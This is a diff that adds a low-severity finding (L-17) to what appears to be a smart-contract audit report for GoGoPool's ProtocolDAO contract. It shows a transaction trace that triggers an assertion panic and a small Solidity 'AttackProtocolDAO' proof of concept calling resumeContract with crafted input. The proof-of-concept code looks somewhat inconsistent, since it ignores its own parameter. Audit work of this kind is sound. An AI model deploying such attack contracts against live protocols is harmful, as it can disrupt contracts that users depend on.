@@ -200,3 +200,54 @@ PoC
 ```
 setUint(keccak256("RewardsPool.RewardsCycleStartTime"), block.timestamp -1);
 ```
+
+## [L-17]
+Title: SWC-110 A user-provided assertion failed with the message 'Panic(0x41)'. 
+
+File:  ProtocolDAO.sol
+
+URL: https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L73-L74
+
+Transaction 1 (contract creation)
+Sender: 0xaffeaffeaffeaffeaffeaffeaffeaffeaffeaffe (Creator)
+Value: 0x0
+Function name: N/A
+Input: 0x60806040523480156200001157600080fd5b5060405162002b8d38038062002b8d83398181016040528101906200003791906200011a565b8080600060016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ff...
+Decoded calldata: N/A
+
+Transaction 2
+Sender: 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa2
+Value: 0x0
+Function name: ProtocolDAO.resumeContract(string)
+Input: ProtocolDAO.resumeContract(0x312fb2be000000000000000000000000000000000000000000000000000000000000002800000000000000000000000000fb0000000000000000000000000000000000000000000000000000)
+Decoded calldata: ProtocolDAO.resumeContract(0x000000000000000000000000000000000000000000000000000000000000002800000000000000000000000000fb0000000000000000000000000000000000000000000000000000)
+
+PoC:
+```
+// SPDX-License-Identifier: GPL-3.0-only
+pragma solidity >=0.6.0 <0.9.0;
+
+import "https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/Base.sol";
+import {TokenGGP} from "https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/tokens/TokenGGP.sol";
+import {Storage} from "https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/Storage.sol";
+
+import "./ProtocolDAO.sol";
+
+/// @title Settings for the Protocol
+contract AttackProtocolDAO {
+    ProtocolDAO public protocoldao;
+
+    constructor(address _protocoldao) public  {
+        protocoldao = ProtocolDAO(_protocoldao);
+    }
+
+    function resumeContract(string memory contractName)
+        public
+        
+    {
+        protocoldao.resumeContract(
+            "0x312fb2be000000000000000000000000000000000000000000000000000000000000002800000000000000000000000000fb0000000000000000000000000000000000000000000000000000"
+        );
+    }
+}
+```
